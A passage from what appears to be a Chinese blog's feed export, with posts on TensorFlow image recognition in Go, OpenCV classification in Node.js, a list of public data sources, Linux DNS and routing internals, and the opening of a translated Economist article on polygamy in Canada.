GOOS)-x86_64-$&#123;TF_VERSION&#125;.tar.gz" |## 查看 tensorflow 版本$ python -c 'import tensorflow as tf; print(tf.__version__)' # for Python 2$ python3 -c 'import tensorflow as tf; print(tf.__version__)' # for Python 3 安装 Go 语言环境,参考：玩转编程语言：Golang 安装 Tensorflow Go binding library 12go get github.com/tensorflow/tensorflow/tensorflow/gogo get github.com/tensorflow/tensorflow/tensorflow/go/op 下载模型（demo model)，包含一个标签文件 label_strings.txt 和 graph.pb 1234mkdir modelwget https://storage.googleapis.com/download.tensorflow.org/models/inception5h.zip -O model/inception.zipunzip model/inception.zip -d modelchmod -R 777 model Tensorflow Model Function123456789101112131415161718192021222324252627//Loading TensorFlow modelfunc loadModel() error &#123; // Load inception model model, err := ioutil.ReadFile("./model/tensorflow_inception_graph.pb") if err != nil &#123; return err &#125; graph = tf.NewGraph() if err := graph.Import(model, ""); err != nil &#123; return err &#125; // Load labels labelsFile, err := os.Open("./model/imagenet_comp_graph_label_strings.txt") if err != nil &#123; return err &#125; defer labelsFile.Close() scanner := bufio.NewScanner(labelsFile) // Labels are separated by newlines for scanner.Scan() &#123; labels = append(labels, scanner.Text()) &#125; if err := scanner.Err(); err != nil &#123; return err &#125; return nil&#125; Classifying Workflow基于 Tensorflow 模型实现图像识别的主要流程如下： 图像转换 (Convert to tensor ) 图像标准化( Normalize ) 图像分类 （ Classifying ) 123456789101112131415161718192021222324func recognizeHandler(w http.ResponseWriter, r *http.Request, _ httprouter.Params) &#123; // Read image imageFile, header, err := r.FormFile("image") // Will contain filename and extension imageName := strings.Split(header.Filename, ".") if err != nil &#123; responseError(w, "Could not read image", http.StatusBadRequest) return &#125; defer imageFile.Close() var imageBuffer bytes.Buffer // Copy image data to a buffer io.Copy(&amp;imageBuffer, imageFile) // ... tensor, err := makeTensorFromImage(&amp;imageBuffer, imageName[:1][0]) if err != nil &#123; responseError(w, "Invalid image", http.StatusBadRequest) return &#125; // ...&#125; 函数 makeTensorFromImage() which runs an image tensor through the normalization graph.1234567891011121314151617181920212223func makeTensorFromImage(imageBuffer *bytes.Buffer, imageFormat string) (*tf.Tensor, error) &#123; tensor, err := tf.NewTensor(imageBuffer.String()) if err != nil &#123; return nil, err &#125; graph, input, output, err := makeTransformImageGraph(imageFormat) if err != nil &#123; return nil, err &#125; session, err := tf.NewSession(graph, nil) if err != nil &#123; return nil, err &#125; defer session.Close() normalized, err := session.Run( map[tf.Output]*tf.Tensor&#123;input: tensor&#125;, []tf.Output&#123;output&#125;, nil) if err != nil &#123; return nil, err &#125; return normalized[0], nil&#125; 函数 maketransformimagegraph() 将图形的像素值调整到 224x224，以符合模型输入参数要求。 12345678910111213141516171819202122232425262728293031func makeTransformImageGraph(imageFormat string) (graph *tf.Graph, input, output tf.Output, err error) &#123; const ( H, W = 224, 224 Mean = float32(117) Scale = float32(1) ) s := op.NewScope() input = op.Placeholder(s, tf.String) // Decode PNG or JPEG var decode tf.Output if imageFormat == "png" &#123; decode = op.DecodePng(s, input, op.DecodePngChannels(3)) &#125; else &#123; decode = op.DecodeJpeg(s, input, op.DecodeJpegChannels(3)) &#125; // Div and Sub perform (value-Mean)/Scale for each pixel output = op.Div(s, op.Sub(s, // Resize to 224x224 with bilinear interpolation op.ResizeBilinear(s, // Create a batch containing a single image op.ExpandDims(s, // Use decoded pixel values op.Cast(s, decode, tf.Float), op.Const(s.SubScope("make_batch"), int32(0))), op.Const(s.SubScope("size"), []int32&#123;H, W&#125;)), op.Const(s.SubScope("mean"), Mean)), op.Const(s.SubScope("scale"), Scale)) graph, err = s.Finalize() return graph, input, output, err&#125; 最后，将格式化的 image tensor 输入到 Inception model graph 中运算。 1234567891011121314151617session, err := tf.NewSession(graph, nil)if err != nil &#123; log.Fatal(err)&#125;defer session.Close()output, err := session.Run( map[tf.Output]*tf.Tensor&#123; graph.Operation("input").Output(0): tensor, &#125;, []tf.Output&#123; graph.Operation("output").Output(0), &#125;, nil)if err != nil &#123; responseError(w, "Could not run inference", http.StatusInternalServerError) return&#125; Testing12345678910111213func main() &#123; if err := loadModel(); err != nil &#123; log.Fatal(err) return &#125; r := httprouter.New() r.POST("/recognize", recognizeHandler) err := http.ListenAndServe(":8080", r) if err != nil &#123; log.Println(err) return &#125;&#125; 12345678910$ curl localhost:8080/recognize -F 'image=@../data/IMG_3560.png'&#123; "filename":"IMG_3000.png", "labels":[ &#123;"label":"black swan","probability":0.98746836,"Percent":"98.75%"&#125;, &#123;"label":"oystercatcher","probability":0.0040768473,"Percent":"0.41%"&#125;, &#123;"label":"American coot","probability":0.002185003,"Percent":"0.22%"&#125;, &#123;"label":"black stork","probability":0.0011524856,"Percent":"0.12%"&#125;, &#123;"label":"redshank","probability":0.0010183558,"Percent":"0.10%"&#125;]&#125; 通过上面的案例我们可以发现，这个服务目前可以对于黑天鹅图像的推算概率值为 98.75%，非常准确；但是对于另外两张宠物狗的图像，最高的推算概率值也仅有 30% 左右，虽然也没有被识别成猫咪或者狼，但是和理想效果要求可用性还有一段距离（此处暂时忽略物种本身的复杂性）。主要是因为现在我们使用的还只是一个非常“原始”的模型，如果需要为小众领域服务（宠物，也可以是其它事物），需要通过训练（Training Models）增强优化，或者引入更丰富的标签，更合适的模型。当然，训练过程中也会存在样本质量不佳的情况，错误样本和各种噪音也会影响准确度。 Lessons Google 制作的节奏紧凑、内容实用的机器学习简介课程 | 使用 TensorFlow API 扩展阅读 How to Retrain Inception’s Final Layer for New Categories Getting Started with TensorFlow: A Machine Learning Tutorial YoutubeIntroduction To TensorFlow We Need to Go Deeper: A Practical Guide to Tensorflow and Inception Tensorflow.org: Image Recognition We know that label 866 (military uniform) should be the top label for the Admiral Hopper image. 扩展阅读:《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 GoLearn Understanding Tensorflow using Go Using your tensorflow model with go Build an Image Recognition API with Go and TensorFlow 以源码方式在Linux安装TensorFlow记录 TensorFlow系统架构及高性能程序设计 Yahoo开源TensorFlowOnSpark TensorFlow和Caffe、MXNet、Keras等其他深度学习框架的对比 TensorFlow、MXNet、PaddlePaddle三个开源库对比]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
        <tag>Machine-Learning</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js]]></title>
    <url>%2F2018%2F01%2F15%2FMachine-Learning-OpenCV%2F</url>
    <content type="text"><![CDATA[摘要 计算机视觉库：OpenCV Using OpenCV with Node.js PriviousOpenCV ( Open Source Computer Vision Library )，是一个基于C/C++语言的计算机视觉库，在跨平台图像/视频处理、模式识别、人机交互、机器人等领域有广泛的应用。 OpenCV 包含机器学习库，支持传统的机器学习算法（决策树、朴素贝叶斯、支持向量机、随机森林等），近期的版本演进侧重于增强深度学习的支持，例如 OpenCV 3.3 将深度神经网络（Deep neural networks，DNN ) 提升到主代码库（promote DNN module from opencv_contrib to the main repository），2017 年 12 月发布的 OpenCV 3.4 针对 R-CNN 进行了性能优化。 OpenCV 的主要编程是 C++ ，大部分的接口也是基于 C++，但它仍然保留着很多 C 接口（功能不完整）。绑定语言（binding）有 Python，java 和 MATLAB /OCTAVE ，另外还有一些其他语言的包装器（wrapper）如 C# , Perl , Haskell 和 Ruby。opencv4nodejs 项目是一个支持所有 OpenCV 3 的 Node.js 绑定，有助于弥补 JavaScript 缺乏计算机视觉实现的不足，为 Node.js 优势应用场景的选型中提供了更多选择（例如使用 WebSocket 推送技术创建实时 Web 应用）。 前文回顾：Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 中演示了一个图像识别的案例，我们来看看基于 OpenCV + Node.js 是如何实现的： Using OpenCV with Node.js Enviroment12345678910111213$ cmake --versioncmake version 3.10.2$ brew install cmake$ brew install opencv3# dependencies for opencv: eigen, lame, x264, xvid, ffmpeg, libpng,# libtiff, ilmbase, openexr, gdbm, python, xz, python3, numpy, tbb$ mkdir project-opencv-demo$ cd project-opencv-demo$ npm init$ npm install --save opencv4nodejs Load InceptionModelTensorflow Inception Model 是一个已经被训练好的模型，可以识别数千类对象，只要将图像输入就可以输出推测的一个分类概率。Tensorflow Inception Model 包括 ‘graph.pb’ 和 ‘label_strings.txt’ 两个文件，使用之前需要先加载。 1234567891011121314151617181920212223242526const cv = require('opencv4nodejs');//const cv = require('../');const fs = require('fs');const path = require('path');if (!cv.xmodules.dnn) &#123; throw new Error('exiting: opencv4nodejs compiled without dnn module');&#125;// replace with path where you unzipped inception modelconst inceptionModelPath = './models/tf-inception'const modelFile = path.resolve(inceptionModelPath, 'tensorflow_inception_graph.pb');const classNamesFile = path.resolve(inceptionModelPath, 'imagenet_comp_graph_label_strings.txt');if (!fs.existsSync(modelFile) || !fs.existsSync(classNamesFile)) &#123; console.log('exiting: could not find inception model'); console.log('download the model from: https://storage.googleapis.com/download.tensorflow.org/models/inception5h.zip'); return;&#125;console.log('load models:'+inceptionModelPath)// read classNames and store them in an arrayconst classNames = fs.readFileSync(classNamesFile).toString().split("\n");// initialize tensorflow inception model from modelFileconst net = cv.readNetFromTensorflow(modelFile); Image Classify读取图片存储为 Blob 格式，调用 net.forward() （图像作为输入参数），此处我们仅输出概率高于 5% 的分类。 1234567891011121314151617181920212223242526272829303132333435const classifyImg = (img) =&gt; &#123; // inception model works with 224 x 224 images, so we resize // our input images and pad the image with white pixels to // make the images have the same width and height const maxImgDim = 224; const white = new cv.Vec(255, 255, 255); const imgResized = img.resizeToMax(maxImgDim).padToSquare(white); // network accepts blobs as input const inputBlob = cv.blobFromImage(imgResized); net.setInput(inputBlob); // forward pass input through entire network, will return // classification result as 1xN Mat with confidences of each class const outputBlob = net.forward(); // find all labels with a minimum confidence const minConfidence = 0.05; const locations = outputBlob .threshold(minConfidence, 1, cv.THRESH_BINARY) .convertTo(cv.CV_8U) .findNonZero(); const result = locations.map(pt =&gt; (&#123; confidence: parseInt(outputBlob.at(0, pt.x) * 100) / 100, className: classNames[pt.x] &#125;)) // sort result by confidence .sort((r0, r1) =&gt; r1.confidence - r0.confidence) .map(res =&gt; `$&#123;res.className&#125; ($&#123;res.confidence&#125;)`); return result;&#125; Test12345678910111213141516171819202122const testData = [ &#123; image: './data/IMG_3560.png', label: 'Yan Dog' &#125;, &#123; image: './data/IMG_3608.png', label: 'Yang Dog' &#125;];testData.forEach((data) =&gt; &#123; const img = cv.imread(data.image); console.log('%s,%s: ', data.image,data.label); const predictions = classifyImg(img); predictions.forEach(p =&gt; console.log(p)); //cv.imshowWait('img', img); console.log("---------finish---------");&#125;); 123456789101112131415161718192021$ npm run tf-classify&gt; node ./tf-classify.jsload models:./models/tf-inception-------------------------------./data/IMG_3560.png,Yan Dog:[ INFO:0] Initialize OpenCL runtime...潘布魯克威尔斯柯基犬 Pembroke (0.83)-------------------------------./data/IMG_4423.png,Yang Dog:吉娃娃 Chihuahua (0.89)Pembroke (0.07)-------------------------------./data/IMG_3608.png,Yang Dog:玩具梗 toy terrier (0.22)美国斯塔福德郡梗 American Staffordshire terrier (0.2)吉娃娃 Chihuahua (0.14)斯塔福德郡牛头梗 Staffordshire bullterrier (0.12)比特犬 whippet (0.05)------------------------------- 问题：对比之前 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 的预测值，两次识别的结果很接近，但是又有不同，这是为什么呢？请注意后续更新。 OpenCV 概要OpenCV ( Open Source Computer Vision Library )，是一个基于C/C++语言的跨平台图像/视频处理函数库。OpenCV 由英特尔公司于1999年发起并参与开发，以 BSD 许可证授权发行，可以在商业和研究领域中免费使用。OpenCV 主要用于开发实时的图像处理、计算机视觉以及模式识别程序。 OpenCV 的主要编程是 C++ ，大部分的接口也是基于 C++，但它仍然保留着很多 C 接口（不完整）。绑定语言（binding）有 Python，java 和 MATLAB /OCTAVE ，另外还有一些其他语言的包装器（wrapper）如 C# , Perl , Haskell 和 Ruby。 OpenCV 版本OpenCV 第一个预览版本于 2000 年在 IEEE Conference 公开，目前每6个月就会有一个官方版本，由一个商业公司赞助的独立小组开发。OpenCV 1.0：2006年发布OpenCV 2.0：2009年10月发布，主要更新包括 C++ 接口OpenCV 2.3：2011年6月发布，主要更新包括移动终端兼容性（NDK-Build）OpenCV 3.0：2015年6月发布OpenCV 3.3: 2017年8月发布，主要更新包括深度学习（promote DNN module from opencv_contrib to the main repository）OpenCV 3.4: 2017年12月发布，主要更新包括 DNN 模块改进（包括 R-CNN 性能优化), Javascript 绑定和 OpenCL 实现 123#查看版本$ pkg-config --modversion opencv3.4.0 OpenCV 主要模块 cv 核心函数库 cvaux 辅助函数库 cxcore 数据结构与线性代数库 highgui GUI 函数库，包括用户界面、读/写图像及视频 ml 机器学习函数库，包括统计模型、贝叶斯、最近邻居、支持向量机、决策树、随机树、最大期望、神经网络等，详见Machine Learning:机器学习算法。 gpu GPU加速,GPU模块及数据结构，包含图像处理与分析模块 OpenCV 主要功能 图像数据操作（内存分配与释放 allocation &amp; release，图像复制 copying、设定和转换 setting &amp; conversion） 矩阵/向量数据操作及线性代数运算（矩阵乘积、矩阵方程求解、特征值、奇异值分解） 支持多种动态数据结构（链表、队列、数据集、树、图） 基本图像处理（去噪、边缘检测、角点检测、采样与插值、色彩变换、形态学处理、直方图、图像金字塔结构） 结构分析（连通域/分支、轮廓处理、距离转换、图像矩、模板匹配、霍夫变换、多项式逼近、曲线拟合、椭圆拟合、狄劳尼三角化） 图像/视频的输入输出（支持文件或摄像头的输入，图像/视频文件的输出） 摄像头定标（寻找和跟踪定标模式、参数定标、基本矩阵估计、单应矩阵估计、立体视觉匹配） 运动分析（光流 optical flow、动作分割 motion segmentation、目标跟踪 tracking） OpenCV 基本数据类型 CvPoint:表示一个坐标为整数的二维点 CvSize:表示矩阵框大小，以像素为精度。 CvRect:通过方形左上角坐标和方形的高和宽来确定一个矩形区域 CvScalar:用来存放像素值（ double 数组，不一定是灰度值） 123456789101112131415161718192021222324typedef struct CvPoint&#123; int x;//图像中点的x坐标 int y;//图像中点的y坐标&#125;typedef struct CvSize&#123; int width; //矩形宽 int height; //矩形高&#125;typedef struct CvRect &#123; int x; //方形的左上角的x-坐标 int y; //方形的左上角的y-坐标 int width; //宽 int height; //高&#125; typedef struct CvScalar&#123; double val[4];&#125; OpenCV 与机器学习OpenCV 包含机器学习库，支持以下算法： Boosting Decision tree learning Gradient boosting trees Expectation-maximization algorithm k-nearest neighbor algorithm Naive Bayes classifier Artificial neural networks Random forest Support vector machine (SVM) Deep neural networks (DNN) （OpenCV 3.3 promote DNN module from opencv_contrib to the main repository） OpenCV 资源 OpenCV github repo Using OpenCV with Node.js opencv4nodejs OpenCV编程简介 Introduction to programming with OpenCV 扩展阅读:《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 The 5 Computer Vision Techniques That Will Change How You See The World Paper Rethinking the Inception Architecture for Computer Vision Node.js meets OpenCV’s Deep Neural Networks — Fun with Tensorflow and Caffe Build an Image Recognition API with Go and TensorFlow Train your own image classifier with Inception in TensorFlow | Wednesday, March 09, 2016 | Google Research Blog Node.js + OpenCV for Face Recognition Node.js + face-recognition.js : Simple and Robust Face Recognition using Deep Learning Node.js meets OpenCV’s Deep Neural Networks — Fun with Tensorflow and Caffe Machine Learning is Fun! Part 4: Modern Face Recognition with Deep Learning Machine Learning with OpenCV and JavaScript: Recognizing Handwritten Letters using HOG and SVM Live Face Detection in Go using OpenCV and MachineBox | video 雅虎开源色情图片检测神经网络]]></content>
      <tags>
        <tag>Developer</tag>
        <tag>Nodejs</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化（十）公共数据源列表]]></title>
    <url>%2F2018%2F01%2F15%2FVisualization-DataSource%2F</url>
    <content type="text"><![CDATA[摘要 优质公开数据源列表 技术支持：爬虫、数据分析与可视化 一、数据源教学数据 (教学数据) Stanford Large Network Dataset Collection 公共数据 经济学人·智库EIU 世界银行·公开数据 世界银行数据清洗器 FSI（Freeman Spogli Institute for International Studies at Stanford) 上海市统计局 中国疾病控制中心：每月疫情通报 中国工业和信息化部：电话用户分省情况 中国财政部：彩票销售 中国科学院：院士名单 Nature WTO:Global Health Observatory (GHO) data 美国国家生物技术信息中心 美国农业部·食品成分数据库 | USDA Food Composition Databases 美国交通部·公开数据库 二、技术支持数据可视化（五）基于网络爬虫制作可视化图表 图表数据可视化技术方案 基于网络爬虫的可视化图表 三、案例 案例：最近十年全国彩票销售变化情况 在线演示 案例：中国科学院院士分布（出生地与籍贯）在线演示 案例：美国航空入境旅客（出发地）变化情况 在线演示 案例：世界主要国家专利申请变化情况（欧洲专利局） 在线演示 参考文献]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>数据可视化</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[操作系统原理:How Linux Works(四):Network]]></title>
    <url>%2F2018%2F01%2F08%2FLinux-Works-Network%2F</url>
    <content type="text"><![CDATA[摘要 一、How DNS Works 二、How Route Works 三、How ARP Works How DNS Works 域名系统（Domain Name System，DNS）将域名和 IP 地址相互映射，能够使人更方便地访问互联网。DNS 最早于 1983 年由保罗·莫卡派乔斯（Paul Mockapetris）发明（RFC 882，RFC 883），1987年发布了修正（RFC 1034，RFC 1035），在此之后 DNS 技术基本上没有改动。 DNS 协议使用端口 53 ，同时兼容 TCP (RFC-793) 和 UDP(RFC-768) ，但是考虑到更低的开销及性能，DNS 查询通常使用 UDP 协议。DNS 消息包括请求和响应两部分, 所有报文包含标题和其他片断 (例如 question 和 RR ，取决于报文类型)。 DNS Message - Header: 给出语义的上下文，包括查询个数、结果个数、 会话 ID 等 DNS Message - Question: 包含要针对 nameserver 执行的查询 DNS Message - RR: 包装格式相同, 可以根据类型分析字段 (RDATA) The DNS assumes that messages will be transmitted as datagrams or in a byte stream carried by a virtual circuit. While virtual circuits can be used for any DNS activity, datagrams are preferred for queries due to their lower overhead and better performance. — 《RFC-1035 DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION》 123456$ping baidu.com | head -1PING baidu.com (220.181.57.216) 56(84) bytes of data.$host baidu.combaidu.com has address 220.181.57.216baidu.com has address 123.125.115.110 unknown hoststrace 是 Linux 环境下的一款程序调试工具，用来监视一个应用程序所使用的系统调用及它所接收的系统信息。借助 strace 我们可以更好地理解 DNS 工作原理。 123456789101112131415161718192021$ping baidu.comping: unknown host baidu.com# strace -e trace=open -f ping -c1 baidu.comopen("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3open("/lib64/libcap.so.2", O_RDONLY|O_CLOEXEC) = 3open("/lib64/libidn.so.11", O_RDONLY|O_CLOEXEC) = 3open("/lib64/libc.so.6", O_RDONLY|O_CLOEXEC) = 3open("/lib64/libattr.so.1", O_RDONLY|O_CLOEXEC) = 3open("/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3open("/etc/resolv.conf", O_RDONLY|O_CLOEXEC) = 4open("/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 4open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 4open("/lib64/libnss_files.so.2", O_RDONLY|O_CLOEXEC) = 4open("/etc/host.conf", O_RDONLY|O_CLOEXEC) = 4open("/etc/hosts", O_RDONLY|O_CLOEXEC) = 4open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 4open("/lib64/libnss_dns.so.2", O_RDONLY|O_CLOEXEC) = 4open("/lib64/libresolv.so.2", O_RDONLY|O_CLOEXEC) = 4ping: unknown host baidu.com+++ exited with 2 +++ hosts - static table lookup for hostnames/etc/hosts 主机名查询静态表；主要用于IP地址与计算机主机名之间的转换。与 /etc/resolv.conf 的区别是，用户可以直接对 hosts 文件进行控制。一般情况下，我们主要通过 DNS 自动提供动态的主机名解析。不过 hosts 文件仍然是一个可以作为备用手段。 【IPv4】 127.0.0.1 localhost 【FQDN】 192.168.1.10 foo.mydomain.org foo 【FQDN】 209.237.226.90 www.opensource.org 【IPv6】 ::1 localhost ip6-localhost ip6-loopback 【IPv6】 ff02::1 ip6-allnodes 【IPv6】 ff02::2 ip6-allrouters /etc/resolv.conf/etc/resolv.conf DNS 客户机配置文件，用于设置 DNS 服务器的 IP 地址及 DNS 域名，还包含了主机的域名搜索顺序。 值得注意的是，许多程序能够覆盖 /etc/resolv.conf 里的内容（例如 dhcpcd, NetworkManager ），但是有些时候我们希望能够手动设定 DNS 设置(比如使用静态IP时)，可以参考以下几种方法： 修改 dhcpcd 配置，echo “nohook resolv.conf” &gt; /etc/dhcpcd.conf 创建 resolv.conf.head ，dhcpcd将把这个文件插入到 /etc/resolv.conf 文件头. 写保护 /etc/resolv.conf，chattr +i /etc/resolv.conf 12# vi /etc/resolv.confnameserver 1.1.1.1 1234567891011121314151617181920212223# strace -e trace=open -f ping -c1 baidu.comopen("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3open("/lib64/libcap.so.2", O_RDONLY|O_CLOEXEC) = 3open("/lib64/libidn.so.11", O_RDONLY|O_CLOEXEC) = 3open("/lib64/libc.so.6", O_RDONLY|O_CLOEXEC) = 3open("/lib64/libattr.so.1", O_RDONLY|O_CLOEXEC) = 3open("/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3open("/etc/resolv.conf", O_RDONLY|O_CLOEXEC) = 4open("/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 4open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 4open("/lib64/libnss_files.so.2", O_RDONLY|O_CLOEXEC) = 4open("/etc/host.conf", O_RDONLY|O_CLOEXEC) = 4open("/etc/hosts", O_RDONLY|O_CLOEXEC) = 4open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 4open("/lib64/libnss_dns.so.2", O_RDONLY|O_CLOEXEC) = 4open("/lib64/libresolv.so.2", O_RDONLY|O_CLOEXEC) = 4PING baidu.com (220.181.57.216) 56(84) bytes of data.open("/etc/hosts", O_RDONLY|O_CLOEXEC) = 464 bytes from 220.181.57.216: icmp_seq=1 ttl=128 time=174 ms--- baidu.com ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 174.062/174.062/174.062/0.000 ms+++ exited with 0 +++ NSSwitchnsswitch.conf（name services switch）是 SUN 公司开发的一种扩展。每一行都标识特定类型的网络信息（如主机、口令和组）以及信息源（如 NIS+ 表、NIS 映射、DNS 主机表或本地 /etc）。 NSSwitch is not just for DNS lookups. It’s also used for passwords and user lookup information. 12345678910111213141516# more /etc/nsswitch.confpasswd: files sssshadow: files sssgroup: files ssshosts: files dnsbootparams: nisplus [NOTFOUND=return] filesethers: filesnetmasks: filesnetworks: filesprotocols: filesrpc: filesservices: files sssnetgroup: files ssspublickey: nisplusautomount: files sssaliases: files nisplus dig | Domain Information Groperdig（Domain Information Groper，域信息搜索器）命令是一个用于查询 DNS 的工具。dig 总共有42个查询选项，涉及到 DNS 信息的方方面面，在 DNS 问题诊断时可以将整个过程信息输出。 1234dig +nocmd google.com 输出过滤版本信息dig +short google.com 输出最精简的CNAME信息和A记录dig +nostat google.com 输出过滤统计信息dig +trace google.com 输出跟踪，从根域查询直到最终结果 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# dig +short google.com74.125.130.10274.125.130.13974.125.130.13874.125.130.10074.125.130.10174.125.130.113# dig +trace google.comDiG 9.9.4-RedHat-9.9.4-18.el7 +trace google.com;; global options: +cmd. 5 IN NS a.root-servers.net.. 5 IN NS b.root-servers.net.. 5 IN NS c.root-servers.net.. 5 IN NS d.root-servers.net.. 5 IN NS e.root-servers.net.. 5 IN NS f.root-servers.net.. 5 IN NS g.root-servers.net.. 5 IN NS h.root-servers.net.. 5 IN NS i.root-servers.net.. 5 IN NS j.root-servers.net.. 5 IN NS k.root-servers.net.. 5 IN NS l.root-servers.net.. 5 IN NS m.root-servers.net.. 5 IN RRSIG NS 8 0 518400 20180803170000 20180721160000 41656 ......;; Received 717 bytes from 192.168.213.2#53(192.168.213.2) in 10120 mscom. 172800 IN NS g.gtld-servers.net.com. 172800 IN NS j.gtld-servers.net.com. 172800 IN NS f.gtld-servers.net.com. 172800 IN NS h.gtld-servers.net.com. 172800 IN NS b.gtld-servers.net.com. 172800 IN NS d.gtld-servers.net.com. 172800 IN NS i.gtld-servers.net.com. 172800 IN NS m.gtld-servers.net.com. 172800 IN NS a.gtld-servers.net.com. 172800 IN NS l.gtld-servers.net.com. 172800 IN NS c.gtld-servers.net.com. 172800 IN NS k.gtld-servers.net.com. 172800 IN NS e.gtld-servers.net.com. 86400 IN DS 30909 8 2 E2D3C916F6DEEAC73294E8268FB5885044A833FC5459588F4A9184CF C41A5766com. 86400 IN RRSIG DS 8 1 86400 20180804050000 20180722040000 41656 ......;; Received 1170 bytes from 192.36.148.17#53(i.root-servers.net) in 10405 msgoogle.com. 172800 IN NS ns2.google.com.google.com. 172800 IN NS ns1.google.com.google.com. 172800 IN NS ns3.google.com.google.com. 172800 IN NS ns4.google.com......;; Received 772 bytes from 192.26.92.30#53(c.gtld-servers.net) in 4914 msgoogle.com. 300 IN A 172.217.31.238;; Received 44 bytes from 216.239.36.10#53(ns3.google.com) in 1003 ms How Route Works （待续）ABC123456789route -n# To Hostroute add -host [ip] dev eth0route add -host [ip] gw [ip]# To Networkroute add -net [ip] netmask [mask]route del -net [ip] netmask [mask] gw [......]# default routeroute add default gw [......] NAT1234/Library/Preferences/VMware Fusion/vmnet8/nat.conf# NAT gateway addressip = 192.168.213.2netmask = 255.255.255.0 How ARP Works （待续） hyperfox:HTTP/HTTPs MITM proxy and traffic recorder with on-the-fly TLS cert generation. arpfox Resources 网卡流量 nLoad123456wget http://www.roland-riegel.de/nload/nload-0.7.2.tar.gztar zxvf nload-0.7.2.tar.gzcd nload-0.7.2./configuremake -j4make install 扩展阅读：电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单 操作系统原理 | How Linux Works（一）：启动 操作系统原理 | How Linux Works（二）：空间管理 操作系统原理 | How Linux Works（三）：内存管理 操作系统原理 | How Linux Works（三）：网络管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 扩展阅读 远程通信协议：从 CORBA 到 gRPC 参考文献 RFC-1035 DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION Writing DNS messages from scratch using Go hosts - static table lookup for hostnames | Linux Programmer’s Manual strace 跟踪进程中的系统调用 Anatomy of a Linux DNS Lookup – Part I Anatomy of a Linux DNS Lookup – Part II 网卡收包流程 | 原创 2017-03-16 信鸽工程师Henry 腾讯大数据 Linux下进程/程序网络带宽占用情况查看工具 – NetHogs 每天一个linux命令（53）：route命令]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Policy-Law-Family]]></title>
    <url>%2F2018%2F01%2F07%2FPolicy-Law-Family%2F</url>
    <content type="text"><![CDATA[摘要 经济学人：加拿大的一夫多妻问题—— 摩门教、移民和穆斯林 经济学人：加拿大的一夫多妻问题 —— 摩门教、移民和穆斯林 Canada’s problem with polygamy Why feminism and multiculturalism make for an awkward mix Dec 7th 2017 | OTTAWA Economist:Canada’s problem with polygamy 在加拿大提到一夫多妻（polygamy）首先想到的可能是 Bountiful （意为慷慨），一个位于不列颠哥伦比亚省（加拿大西部）以此命名的城镇。加拿大最著名的一夫多妻代表人是 Winston Blackmore，已经拥有 148 个孩子。Winston Blackmore 和 James Oler，他们是摩门教（Mormonism，广义地是指在宗教信仰、意识形态和文化上相近的几个宗派，其最大的宗派为耶稣基督后期圣徒教会）原教旨主义教派的信徒，实行“一夫多妻（plural marriage）”已经几十年，直到七月份（2017年）法院判决他们一夫多妻罪名成立。（他们的上诉将在12月12日审理）。 自从 1892 年之后的一个多世纪以来，这还是第一次在法律层面被定罪的案例——旨在阻止美国的多妻者（polygamists）在加拿大奉行一夫多妻制。他们中的许多人是摩门教徒，不满于教会在 1890 年放弃一夫多妻制的主张（摩门教会在 1852年实施多妻制，1890 年美国国会立法禁止，主流教派遂放弃实行）。加拿大当局一直担心提出这样的指控可能面临宪法挑战。这一障碍在 2011 年被撤销，当时不列颠哥伦比亚省最高法院确立“宗教自由不能作为判断是否伤害他人行为的依据”。 关于人权和宗教自由原则冲突的辩论正在转向伊斯兰移民。该舆情发展部分是因为审判 Mohammad Shafia 的案件，2009 年 Mohammad Shafia 